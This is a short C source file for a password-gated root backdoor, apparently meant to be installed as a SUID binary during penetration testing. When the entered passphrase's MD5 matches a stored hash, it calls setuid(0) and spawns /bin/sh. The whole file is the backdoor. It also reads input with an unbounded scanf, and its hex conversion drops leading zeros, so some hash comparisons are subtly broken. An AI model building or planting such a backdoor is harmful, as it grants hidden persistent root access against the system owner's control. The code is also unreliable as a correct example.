/*
    Original code from: https://focus-linux.securityfocus.narkive.com/L4uQ5nDr/no-root-shell-with-suid-bin-bash
*/

// Compiling: gcc getroot.c -o getroot -lssl -lcrypto -static

#include <stdio.h>
#include <string.h>
#include <openssl/md5.h>

// Generar MD5 de una contraseña conocida para el pentester
// y registrarla en la siguiente variable:
char my_stored_hash[]="102ddaf691e1615d5dacd4c86299bfa4";

void hex_to_string(char* sourceaddress, char* destaddress, int length) {
    char temp[20];
    int i;
    destaddress[0]='\0';
    for(i=0; i<length; i++) {
        unsigned char current=sourceaddress[i];
        sprintf(temp, "%x", current);
        strcat(destaddress, temp);
    }
}

int main(void) {
    char input_passphrase[16384];
    char md5sum[16384];
    char md5_string[16384];

    printf("Enter pass input_passphrase:");
    scanf ("%s", input_passphrase);

    MD5(input_passphrase, strlen(input_passphrase), md5sum);
    hex_to_string(md5sum, md5_string, 16);

    if(!strncmp(md5_string, my_stored_hash, strlen(my_stored_hash))) {
        // Password match
        setuid(0);
        system("/bin/sh");
        return 0;
    } else {
        return 1;
    }
    
}
